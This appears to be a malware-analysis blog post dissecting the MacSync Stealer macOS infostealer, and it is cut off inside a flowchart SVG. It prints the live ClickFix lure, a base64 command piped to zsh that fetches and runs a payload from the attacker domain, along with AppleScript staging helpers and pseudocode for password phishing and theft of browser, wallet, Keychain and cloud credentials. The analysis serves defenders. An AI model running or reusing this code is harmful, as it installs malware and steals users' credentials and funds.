![mermaid-diagram-2026-01-08T11-05-28](https://github.com/user-attachments/assets/17b2c1aa-b567-477c-87a8-0fb0ceae32c8)---
title: Deep Analysis of the Malicious AppleScript Payload (MacSync Stealer)
author: Manan
date: 2026-01-08 10:10:00 +0100
categories: [Malware Analysis, C2]
tags: [Malware Analysis]
image:
  path: https://github.com/user-attachments/assets/daf954fc-c63d-476f-a3ba-82fec08f5da1
  alt: 
render_with_liquid: false
---

A security professional working in the threat hunting domain recently identified a suspicious URL specifically targeting macOS users. The campaign appears to leverage a macOS variant of the well-known ClickFix technique, making it particularly noteworthy. Cognisys researchers accepted this challenge to understand this malicious code. 

Initial analysis shows that this sample shares characteristics with earlier remote-fetched variants, which typically relied on obfuscated Zsh scripts that invoked dynamic AppleScript for execution. However, this iteration demonstrates a clear evolution in tradecraft. The activity is largely memory-resident and leaves minimal artifacts on disk, significantly reducing its forensic footprint and making detection and analysis more challenging for defenders.
<img width="1288" height="928" alt="image1" src="https://github.com/user-attachments/assets/360c3ae8-c49a-46a8-afa3-d4403c6da3ef" />

A quick review identified that this sample have similarities with older remote-fetched variants (delivered via obfuscated Zsh → dynamic AppleScript), while this one is memory-resident with minimal disk traces.

 
**Background**

In mid-2025, MacSync Stealer emerged as a rebranded evolution of the low-cost Mac.c infostealer (first observed in April 2025), quickly gaining traction among cybercriminals for its cryptocurrency-focused theft capabilities. This report examines a variant from the family's script-based era.

This sample relies on classic social engineering techniques such as ClickFix(a deceptive social engineering technique used by cybercriminals to manipulate victims into clicking on malicious links or downloading harmful files ) or drag-to-terminal tricks to execute an obfuscated Zsh loader that remotely fetches and runs a large AppleScript payload. Unlike the modern "hands-off" Swift droppers, this version requires user interaction to initiate but compensates with aggressive in-memory execution, password phishing, and attempts to trojanize popular hardware wallet apps which is distributed by a russian APT via https://macdatainbox.com/r2/

**Initial Detection**

Most payloads related to MacSync Stealer tend to run primarily in memory and leave little to no trace on disk. They typically rely on a ClickFix-style technique that tricks users into pasting a base64 encoded command. In both cases, the payload is decoded using base64 -D, decompressed with gunzip, stored in a variable and executed using eval. This then results in the fetching of a second-stage payload via curl.
 
<img width="1286" height="866" alt="image2 1" src="https://github.com/user-attachments/assets/f6474d80-7062-411c-884f-854ab73ce107" />

```
echo "Apple-Installer: https://apps.apple.com/hidenn-gift.application/macOsAppleApicationSetup421415.dmg" && echo 'ZWNobyAnSW5zdGFsbGluZyBwYWNrYWdlcyBwbGVhc2Ugd2FpdC4uLicgJiYgY3VybCAta2ZzU0wgaHR0cDovL2JhcmJlcm1vby53b3JsZC9jdXJsL2M4ZjM4OTc2ODBiNDQ4YzE5N2I5YzY2MTQ0YmY4MWQyMjg2MzNmYmRlYmVkNzg4ZTFmMDYyNWE0ZGU4MzQ4MjV8enNo'|base64 -D|zsh
```

Base64 code block

Once decoded, the base64 payload is a match to the usual MacSync Stealer. barbermoo[.]world domain is used for hosting and uploading the infostealer files & logs.
<img width="2158" height="100" alt="image3" src="https://github.com/user-attachments/assets/55943917-14c6-4d14-ae97-763822916aa8" />
  
This downloads & executes two different scripts using curl & osascript which does the following operations.<img width="1992" height="1092" alt="image5" src="https://github.com/user-attachments/assets/b99f60a0-e28d-4aec-a0e8-3a0b90fde05d" />

#### Evolution of MacSync Stealer: A Deep Dive into Memory-Resident macOS Malware

In the ever-evolving landscape of macOS threats, researchers at Cognisys have deconstructed a sophisticated variant of **MacSync Stealer (v1.1.2_release)**. While earlier versions relied on more traditional disk-based artifacts, this latest iteration demonstrates a significant evolution in tradecraft—shifting toward memory-resident execution to significantly reduce its forensic footprint.


---

## 1. Utility Functions: Foundations of Stealth

The malware utilizes several foundational helper functions to handle file operations reliably across different macOS environments. These functions enable safe, recursive copying of large directory trees (such as wallet folders) without errors, which is critical for stealthy data staging.


```java
on filesizer(paths)
	set fsz to 0
	try
		set theItem to quoted form of POSIX path of paths
		set fsz to (do shell script "/usr/bin/mdls -name kMDItemFSSize -raw " & theItem)
	end try
	return fsz
end filesizer

on mkdir(someItem)
	try
		set filePosixPath to quoted form of (POSIX path of someItem)
		do shell script "mkdir -p " & filePosixPath
	end try
end mkdir

on FileName(filePath)
	try
		set reversedPath to (reverse of every character of filePath) as string
		set trimmedPath to text 1 thru ((offset of "/" in reversedPath) - 1) of reversedPath
		set finalPath to (reverse of every character of trimmedPath) as string
		return finalPath
	end try
end FileName

on BeforeFileName(filePath)
	try
		set lastSlash to offset of "/" in (reverse of every character of filePath) as string
		set trimmedPath to text 1 thru -(lastSlash + 1) of filePath
		return trimmedPath
	end try
end BeforeFileName

on writeText(textToWrite, filePath)
	try
		set folderPath to BeforeFileName(filePath)
		mkdir(folderPath)
		set fileRef to (open for access filePath with write permission)
		write textToWrite to fileRef starting at eof
		close access fileRef
	end try
end writeText

on readwrite(path_to_file, path_as_save)
	try
		set fileContent to read path_to_file
		set folderPath to BeforeFileName(path_as_save)
		mkdir(folderPath)
		do shell script "cat " & quoted form of path_to_file & " > " & quoted form of path_as_save
	end try
end readwrite

on isDirectory(someItem)
	try
		set filePosixPath to quoted form of (POSIX path of someItem)
		set fileType to (do shell script "file -b " & filePosixPath)
		if fileType ends with "directory" then
			return true
		end if
		return false
	end try
end isDirectory
```

---

## 2. Recursive Folder Copying

MacSync Stealer employs targeted recursive copying to exfiltrate high-value directories while avoiding "bloat" from system noise.

```bash
on GrabFolderLimit(sourceFolder, destinationFolder)
... exceptionsList includes ".DS_Store", "Cache", etc.
repeat with currentItem ...
if bankSize < 100 * 1024 * 1024 then readwrite(...)
end GrabFolderLimit

on GrabFolder(sourceFolder, destinationFolder)
... broader exceptions, including "dumps", "emoji", "__update__"
unconditionally copies all files/subfolders
end GrabFolder
```

- **GrabFolderLimit**: A size-capped recursive copy (max ~100 MB) used selectively to avoid large, low-value archives.

- **GrabFolder**: An unlimited recursive copy used for high-priority targets like desktop wallets and Telegram data.


---

## 3. Sophisticated Password Phishing

A hallmark of advanced macOS stealers is the ability to gain full user privileges through social engineering. MacSync Stealer uses a convincing phishing dialog complete with the official macOS locked icon and "System Preferences" title to capture the user's password.


```rust
on checkvalid(username, password_entered)
do shell script "dscl . authonly " & quoted form of username & space & quoted form of password_entered
... returns true only if authentication succeeds silently
end checkvalid

on getpwd(username, writemind, provided_password)
if provided_password valid -> save and return
if empty password works -> extract Chrome master password
else -> repeat loop:
display dialog "Required Application Helper..." 
with icon LockedIcon.icns, title "System Preferences"
save captured password to staging dir
end getpwd
```

The script loops indefinitely until a valid password is provided, enabling Keychain access and deeper system theft.

---

## 4. Comprehensive Browser Data Theft

The malware performs broad exfiltration across major browser engines, focusing on authentication and session data.

- **Chromium Engines**: Targets Chrome, Brave, Edge, Opera, Yandex, and Arc. It specifically harvests cookies, login data, web data, and history.
- **Gecko Engines**: Targets Firefox profiles, copying key databases like `logins.json`, `key4.db`, and `cookies.sqlite`.

```javascript
on Chromium(writemind, chromium_map)

targets: Chrome, Brave, Edge, Opera, Yandex, Arc, etc.

copies: Cookies, Login Data, Web Data, History

special handling for /Local Extension Settings/ and /IndexedDB/

→ calls grabPlugins with list of ~20 non-wallet extension IDs

end Chromium

on Gecko(writemind, gecko_map)

targets Firefox profiles

copies key databases: logins.json, key4.db, cookies.sqlite, places.sqlite
end Gecko**
```

---

## 5. Targeted Cryptocurrency Theft

The primary motivation of MacSync Stealer is the compromise of cryptocurrency assets.

### Web Wallets

The script targets multiple browser extension IDs, including MetaMask, Phantom, and TronLink. It specifically grabs `Local Extension Settings` and `IndexedDB` folders, which often contain unencrypted seed phrases or private keys.
### Desktop & Hardware Wallets

The malware performs unconditional copies of entire desktop wallet directories. Targeted wallets include:

- Trezor
- Ledger

```javascript
on ChromiumWallets(writemind, chromium_map)
pluginList with ~40+ extension IDs including:
nkbihfbeogaeaoehlefnkodbefgpgknn → MetaMask
bfnaelmomeimhlpmgjnjophhpkkoljpa → MetaMask (alternate)
... Phantom, TronLink, Yoroi, Binance Chain, Ronin, etc.
grabs Local Extension Settings and IndexedDB for matching extensions
end ChromiumWallets
```

---

## 6. Additional High-Value Collection

Beyond cryptocurrency, the stealer harvests a wide array of personal and professional data:

- **Telegram**: Full `tdata/` folder for session hijacking.
- **Keychains**: All `*.keychain-db` files.
- **CloudKeys**: `.ssh`, `.aws`, and `.kube` directories for developer credential theft.
- **Filegrabber**: Scans Desktop, Documents, and Downloads for specific extensions like `.wallet`, `.seed`, `.kdbx`, `.pem`, and `.ovpn`.

```java
Telegram(writemind, library) → full tdata/ folder

Keychains(writemind) → copies all *.keychain-db files

CloudKeys(writemind) → .ssh, .aws, .kube directories

Filegrabber(writemind) → scans Desktop/Documents/Downloads for:

.wallet, .seed, .kdbx (KeePass), .pem, .ovpn, documents

size-limited to ~10 MB, renamed sequentially

also grabs Safari cookies, autofill, history, Apple Notes databases

```

---

## 7. Exfiltration & Cleanup

To maintain a low profile, the malware zips the staged data and cleans up its tracks.

```bash
do shell script "ditto -c -k --sequesterRsrc " & writemind & " /tmp/osalogging.zip"
do shell script "rm -rf /tmp/sync*"
display dialog "Your Mac does not support this application..." with icon stop
```

The script uses the macOS-specific `ditto` command to preserve resource forks in the final ZIP. After the data is prepared, it displays a benign-looking error dialog to dismiss user suspicion while the background exfiltration completes.


#### 8. Persistence / Backdoor Installation

In order to make persistence, it checks for installed applications like ledger, trezor(popular crypto wallets) and downloads a .zip file with app.asar and Info.plist for the suitable application in order to replace the original ones.

  
<img width="2156" height="922" alt="Pasted image 20260108103659" src="https://github.com/user-attachments/assets/5f4e5e1c-48ca-4c37-a9ed-3bd5495e8a42" />

<img width="1992" height="1018" alt="Pasted image 20260108103735" src="https://github.com/user-attachments/assets/b4cd8f54-520f-474c-ac51-059fa4cebecb" />

#### 9. Threat Overview (Blue Team Perspective)

- Family: MacSync Stealer (rebranded from Mac.c; sometimes linked to "coins" or "ooiid" generic detections). 

- Version in this sample: Explicitly self-identifies as 1.1.2_release (x64_86 & ARM), "Build Tag: r2" – this is an older build (likely mid-2025), predating the December 2025 signed Swift variants. 

- Primary Motivation: Cryptocurrency theft + credential harvesting (heavy focus on wallets, browsers, Keychain). 

- TTPs (MITRE ATT&CK aligned):


- Initial Access: Social engineering (pirated software, fake installers, phishing DMGs). 

- Execution: osascript (AppleScript) + shell commands. 

- Privilege Escalation/Credential Access: Phishes macOS login password via fake System Preferences dialogues; validates with dscl; dumps Keychain. 

- Discovery/Collection: Recursive folder copying, targeted file grabbing (seed phrases, wallets, docs). 

- Exfiltration: ZIP to /tmp/osalogging.zip (intended for POST to C2 /gate). 

- Impact/Persistence: Attempts to Trojanize Ledger/Trezor apps via a malicious app.asar replacement. 


- Current Activity: Highly active as of Dec 2025; newer variants use notarised Swift binaries for silent payload fetch (similar technique: curl with headers to C2). 


  

#### 10. Detailed Payload Behaviour (Step-by-Step)


<svg id="mermaid-1767870323128-cmx15yvgp" width="100%" xmlns="http://www.w3.org/2000/svg" class="flowchart" style="max-width: 1463.359375px;" viewBox="0 0 1463.359375 2496.75" role="graphics-document document" aria-roledescription="flowchart-v2"><style>#mermaid-1767870323128-cmx15yvgp{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;fill:#333;}@keyframes edge-animation-frame{from{stroke-dashoffset:0;}}@keyframes dash{to{stroke-dashoffset:0;}}#mermaid-1767870323128-cmx15yvgp .edge-animation-slow{stroke-dasharray:9,5!important;stroke-dashoffset:900;animation:dash 50s linear infinite;stroke-linecap:round;}#mermaid-1767870323128-cmx15yvgp .edge-animation-fast{stroke-dasharray:9,5!important;stroke-dashoffset:900;animation:dash 20s linear infinite;stroke-linecap:round;}#mermaid-1767870323128-cmx15yvgp .error-icon{fill:#552222;}#mermaid-1767870323128-cmx15yvgp .error-text{fill:#552222;stroke:#552222;}#mermaid-1767870323128-cmx15yvgp .edge-thickness-normal{stroke-width:1px;}#mermaid-1767870323128-cmx15yvgp .edge-thickness-thick{stroke-width:3.5px;}#mermaid-1767870323128-cmx15yvgp .edge-pattern-solid{stroke-dasharray:0;}#mermaid-1767870323128-cmx15yvgp .edge-thickness-invisible{stroke-width:0;fill:none;}#mermaid-1767870323128-cmx15yvgp .edge-pattern-dashed{stroke-dasharray:3;}#mermaid-1767870323128-cmx15yvgp .edge-pattern-dotted{stroke-dasharray:2;}#mermaid-1767870323128-cmx15yvgp .marker{fill:#333333;stroke:#333333;}#mermaid-1767870323128-cmx15yvgp .marker.cross{stroke:#333333;}#mermaid-1767870323128-cmx15yvgp svg{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;}#mermaid-1767870323128-cmx15yvgp p{margin:0;}#mermaid-1767870323128-cmx15yvgp .label{font-family:"trebuchet ms",verdana,arial,sans-serif;color:#333;}#mermaid-1767870323128-cmx15yvgp .cluster-label text{fill:#333;}#mermaid-1767870323128-cmx15yvgp .cluster-label span{color:#333;}#mermaid-1767870323128-cmx15yvgp .cluster-label span p{background-color:transparent;}#mermaid-1767870323128-cmx15yvgp .label text,#mermaid-1767870323128-cmx15yvgp span{fill:#333;color:#333;}#mermaid-1767870323128-cmx15yvgp .node rect,#mermaid-1767870323128-cmx15yvgp .node circle,#mermaid-1767870323128-cmx15yvgp .node ellipse,#mermaid-1767870323128-cmx15yvgp .node polygon,#mermaid-1767870323128-cmx15yvgp .node path{fill:#ECECFF;stroke:#9370DB;stroke-width:1px;}#mermaid-1767870323128-cmx15yvgp .rough-node .label text,#mermaid-1767870323128-cmx15yvgp .node .label text,#mermaid-1767870323128-cmx15yvgp .image-shape .label,#mermaid-1767870323128-cmx15yvgp .icon-shape .label{text-anchor:middle;}#mermaid-1767870323128-cmx15yvgp .node .katex path{fill:#000;stroke:#000;stroke-width:1px;}#mermaid-1767870323128-cmx15yvgp .rough-node .label,#mermaid-1767870323128-cmx15yvgp .node .label,#mermaid-1767870323128-cmx15yvgp .image-shape .label,#mermaid-1767870323128-cmx15yvgp .icon-shape .label{text-align:center;}#mermaid-1767870323128-cmx15yvgp .node.clickable{cursor:pointer;}#mermaid-1767870323128-cmx15yvgp .root .anchor path{fill:#333333!important;stroke-width:0;stroke:#333333;}#mermaid-1767870323128-cmx15yvgp .arrowheadPath{fill:#333333;}#mermaid-1767870323128-cmx15yvgp .edgePath .path{stroke:#333333;stroke-width:2.0px;}#mermaid-1767870323128-cmx15yvgp .flowchart-link{stroke:#333333;fill:none;}#mermaid-1767870323128-cmx15yvgp .edgeLabel{background-color:rgba(232,232,232, 0.8);text-align:center;}#mermaid-1767870323128-cmx15yvgp .edgeLabel p{background-color:rgba(232,232,232, 0.8);}#mermaid-1767870323128-cmx15yvgp .edgeLabel rect{opacity:0.5;background-color:rgba(232,232,232, 0.8);fill:rgba(232,232,232, 0.8);}#mermaid-1767870323128-cmx15yvgp .labelBkg{background-color:rgba(232, 232, 232, 0.5);}#mermaid-1767870323128-cmx15yvgp .cluster rect{fill:#ffffde;stroke:#aaaa33;stroke-width:1px;}#mermaid-1767870323128-cmx15yvgp .cluster text{fill:#333;}#mermaid-1767870323128-cmx15yvgp .cluster span{color:#333;}#mermaid-1767870323128-cmx15yvgp div.mermaidTooltip{position:absolute;text-align:center;max-width:200px;padding:2px;font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:12px;background:hsl(80, 100%, 96.2745098039%);border:1px solid #aaaa33;border-radius:2px;pointer-events:none;z-index:100;}#mermaid-1767870323128-cmx15yvgp .flowchartTitleText{text-anchor:middle;font-size:18px;fill:#333;}#mermaid-1767870323128-cmx15yvgp rect.text{fill:none;stroke-width:0;}#mermaid-1767870323128-cmx15yvgp .icon-shape,#mermaid-1767870323128-cmx15yvgp .image-shape{background-color:rgba(232,232,232, 0.8);text-align:center;}#mermaid-1767870323128-cmx15yvgp .icon-shape p,#mermaid-1767870323128-cmx15yvgp .image-shape p{background-color:rgba(232,232,232, 0.8);padding:2px;}#mermaid-1767870323128-cmx15yvgp .icon-shape rect,#mermaid-1767870323128-cmx15yvgp .image-shape rect{opacity:0.5;background-color:rgba(232,232,232, 0.8);fill:rgba(232,232,232, 0.8);}#mermaid-1767870323128-cmx15yvgp .label-icon{display:inline-block;height:1em;overflow:visible;vertical-align:-0.125em;}#mermaid-1767870323128-cmx15yvgp .node .label-icon path{fill:currentColor;stroke:revert;stroke-width:revert;}#mermaid-1767870323128-cmx15yvgp :root{--mermaid-font-family:"trebuchet ms",verdana,arial,sans-serif;}</style><g><marker id="mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd" class="marker flowchart-v2" viewBox="0 0 10 10" refX="5" refY="5" markerUnits="userSpaceOnUse" markerWidth="8" markerHeight="8" orient="auto"><path d="M 0 0 L 10 5 L 0 10 z" class="arrowMarkerPath" style="stroke-width: 1; stroke-dasharray: 1, 0;"></path></marker><marker id="mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointStart" class="marker flowchart-v2" viewBox="0 0 10 10" refX="4.5" refY="5" markerUnits="userSpaceOnUse" markerWidth="8" markerHeight="8" orient="auto"><path d="M 0 5 L 10 10 L 10 0 z" class="arrowMarkerPath" style="stroke-width: 1; stroke-dasharray: 1, 0;"></path></marker><marker id="mermaid-1767870323128-cmx15yvgp_flowchart-v2-circleEnd" class="marker flowchart-v2" viewBox="0 0 10 10" refX="11" refY="5" markerUnits="userSpaceOnUse" markerWidth="11" markerHeight="11" orient="auto"><circle cx="5" cy="5" r="5" class="arrowMarkerPath" style="stroke-width: 1; stroke-dasharray: 1, 0;"></circle></marker><marker id="mermaid-1767870323128-cmx15yvgp_flowchart-v2-circleStart" class="marker flowchart-v2" viewBox="0 0 10 10" refX="-1" refY="5" markerUnits="userSpaceOnUse" markerWidth="11" markerHeight="11" orient="auto"><circle cx="5" cy="5" r="5" class="arrowMarkerPath" style="stroke-width: 1; stroke-dasharray: 1, 0;"></circle></marker><marker id="mermaid-1767870323128-cmx15yvgp_flowchart-v2-crossEnd" class="marker cross flowchart-v2" viewBox="0 0 11 11" refX="12" refY="5.2" markerUnits="userSpaceOnUse" markerWidth="11" markerHeight="11" orient="auto"><path d="M 1,1 l 9,9 M 10,1 l -9,9" class="arrowMarkerPath" style="stroke-width: 2; stroke-dasharray: 1, 0;"></path></marker><marker id="mermaid-1767870323128-cmx15yvgp_flowchart-v2-crossStart" class="marker cross flowchart-v2" viewBox="0 0 11 11" refX="-1" refY="5.2" markerUnits="userSpaceOnUse" markerWidth="11" markerHeight="11" orient="auto"><path d="M 1,1 l 9,9 M 10,1 l -9,9" class="arrowMarkerPath" style="stroke-width: 2; stroke-dasharray: 1, 0;"></path></marker><g class="root"><g class="clusters"><g class="cluster " id="Phase_5" data-look="classic"><rect style="fill:#cccccc !important;stroke:#000000 !important;stroke-width:2px !important" x="684.796875" y="2048.75" width="330" height="440"></rect><g class="cluster-label " transform="translate(749.796875, 2048.75)"><foreignObject width="200" height="48"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 200px; text-align: center; width: 200px;"><span class="nodeLabel "><p>Phase 5: Exfiltration &amp; Cleanup</p></span></div></foreignObject></g></g><g class="cluster " id="Phase_4" data-look="classic"><rect style="" x="97.8046875" y="1312.5703125" width="1225.3671875" height="686.1796875"></rect><g class="cluster-label " transform="translate(610.48828125, 1312.5703125)"><foreignObject width="200" height="48"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 200px; text-align: center; width: 200px;"><span class="nodeLabel "><p>Phase 4: Persistence &amp; Backdoor</p></span></div></foreignObject></g></g><g class="cluster " id="Phase_3" data-look="classic"><rect style="" x="8" y="1030.5703125" width="1447.359375" height="232"></rect><g class="cluster-label " transform="translate(642.6640625, 1030.5703125)"><foreignObject width="178.03125" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>Phase 3: Data Harvesting</p></span></div></foreignObject></g></g><g class="cluster " id="Phase_2" data-look="classic"><rect style="fill:#dddddd !important;stroke:#000000 !important;stroke-width:2px !important" x="97.8046875" y="474" width="1225.3671875" height="506.5703125"></rect><g class="cluster-label " transform="translate(614.26953125, 474)"><foreignObject width="192.4375" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel "><p>Phase 2: Password Phishing</p></span></div></foreignObject></g></g><g class="cluster " id="Phase_1" data-look="classic"><rect style="fill:#eeeeee !important;stroke:#000000 !important;stroke-width:2px !important" x="534.69921875" y="8" width="329.8984375" height="416"></rect><g class="cluster-label " transform="translate(599.6484375, 8)"><foreignObject width="200" height="48"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table; white-space: break-spaces; line-height: 1.5; max-width: 200px; text-align: center; width: 200px;"><span class="nodeLabel "><p>Phase 1: Anti-Forensics &amp; Stealth</p></span></div></foreignObject></g></g></g><g class="edgePaths"><path d="M699.648,87L699.648,91.167C699.648,95.333,699.648,103.667,699.648,111.333C699.648,119,699.648,126,699.648,129.5L699.648,133" id="L_A_B_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M699.648,191L699.648,195.167C699.648,199.333,699.648,207.667,699.648,215.333C699.648,223,699.648,230,699.648,233.5L699.648,237" id="L_B_C_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M699.648,295L699.648,299.167C699.648,303.333,699.648,311.667,699.648,319.333C699.648,327,699.648,334,699.648,337.5L699.648,341" id="L_C_D_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M699.648,399L699.648,403.167C699.648,407.333,699.648,415.667,699.648,424C699.648,432.333,699.648,440.667,699.648,449C699.648,457.333,699.648,465.667,699.648,473.333C699.648,481,699.648,488,699.648,491.5L699.648,495" id="L_D_E_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M569.648,555.852L499.074,565.543C428.5,575.235,287.352,594.617,296.37,622.326C305.388,650.035,464.573,686.07,544.166,704.088L623.758,722.106" id="L_E_F_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M772.244,723.596L856.763,705.33C941.281,687.064,1110.318,650.532,1120.547,622.526C1130.775,594.521,982.195,575.042,907.905,565.303L833.614,555.563" id="L_F_E_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M699.648,827.57L699.648,833.737C699.648,839.904,699.648,852.237,699.648,863.904C699.648,875.57,699.648,886.57,699.648,892.07L699.648,897.57" id="L_F_G_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M578.582,940.155L508.186,946.891C437.789,953.627,296.996,967.098,226.6,978.001C156.203,988.904,156.203,997.237,156.203,1005.57C156.203,1013.904,156.203,1022.237,156.203,1029.904C156.203,1037.57,156.203,1044.57,156.203,1048.07L156.203,1051.57" id="L_G_H_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M156.203,1109.57L156.203,1113.737C156.203,1117.904,156.203,1126.237,156.203,1135.904C156.203,1145.57,156.203,1156.57,156.203,1162.07L156.203,1167.57" id="L_H_H1_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M621.869,955.57L609.866,959.737C597.863,963.904,573.857,972.237,561.855,980.57C549.852,988.904,549.852,997.237,549.852,1005.57C549.852,1013.904,549.852,1022.237,549.852,1029.904C549.852,1037.57,549.852,1044.57,549.852,1048.07L549.852,1051.57" id="L_G_I_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M482.274,1109.57L471.846,1113.737C461.417,1117.904,440.56,1126.237,430.132,1135.904C419.703,1145.57,419.703,1156.57,419.703,1162.07L419.703,1167.57" id="L_I_I1_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M627.813,1109.57L639.844,1113.737C651.876,1117.904,675.938,1126.237,687.969,1133.904C700,1141.57,700,1148.57,700,1152.07L700,1155.57" id="L_I_I2_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M820.715,949.559L850.528,954.728C880.341,959.896,939.967,970.233,969.781,979.568C999.594,988.904,999.594,997.237,999.594,1005.57C999.594,1013.904,999.594,1022.237,999.594,1029.904C999.594,1037.57,999.594,1044.57,999.594,1048.07L999.594,1051.57" id="L_G_J_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M999.594,1109.57L999.594,1113.737C999.594,1117.904,999.594,1126.237,999.594,1135.904C999.594,1145.57,999.594,1156.57,999.594,1162.07L999.594,1167.57" id="L_J_J1_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M820.715,939.149L899.725,946.052C978.734,952.956,1136.754,966.763,1215.764,977.833C1294.773,988.904,1294.773,997.237,1294.773,1005.57C1294.773,1013.904,1294.773,1022.237,1294.773,1029.904C1294.773,1037.57,1294.773,1044.57,1294.773,1048.07L1294.773,1051.57" id="L_G_K_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M1294.773,1109.57L1294.773,1113.737C1294.773,1117.904,1294.773,1126.237,1294.773,1135.904C1294.773,1145.57,1294.773,1156.57,1294.773,1162.07L1294.773,1167.57" id="L_K_K1_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M156.203,1225.57L156.203,1231.737C156.203,1237.904,156.203,1250.237,156.203,1260.57C156.203,1270.904,156.203,1279.237,156.203,1287.57C156.203,1295.904,156.203,1304.237,255.31,1328.278C354.416,1352.319,552.629,1392.068,651.736,1411.942L750.842,1431.816" id="L_H1_L_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M700,1237.57L700,1241.737C700,1245.904,700,1254.237,700,1262.57C700,1270.904,700,1279.237,700,1287.57C700,1295.904,700,1304.237,714.618,1321.977C729.235,1339.716,758.471,1366.862,773.089,1380.435L787.706,1394.008" id="L_I2_L_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M999.594,1225.57L999.594,1231.737C999.594,1237.904,999.594,1250.237,999.594,1260.57C999.594,1270.904,999.594,1279.237,999.594,1287.57C999.594,1295.904,999.594,1304.237,984.976,1321.977C970.358,1339.716,941.123,1366.862,926.505,1380.435L911.887,1394.008" id="L_J1_L_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M1294.773,1225.57L1294.773,1231.737C1294.773,1237.904,1294.773,1250.237,1294.773,1260.57C1294.773,1270.904,1294.773,1279.237,1294.773,1287.57C1294.773,1295.904,1294.773,1304.237,1235.734,1326.858C1176.694,1349.479,1058.615,1386.388,999.575,1404.843L940.535,1423.297" id="L_K1_L_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M759.062,1475.015L676.352,1496.304C593.643,1517.593,428.224,1560.172,345.514,1586.961C262.805,1613.75,262.805,1624.75,262.805,1630.25L262.805,1635.75" id="L_L_M_0" class=" edge-thickness-normal edge-pattern-solid edge-thickness-normal edge-pattern-solid flowchart-link" style="" marker-end="url(#mermaid-1767870323128-cmx15yvgp_flowchart-v2-pointEnd)"></path><path d="M262.805,1717.75L262.805,1723.917C262.805,1730.083,262.805,1742.417,262.805,1754.083C262.805,1765.75,262.805,1776.75,262.805,1782.25L262.805,1787.75" 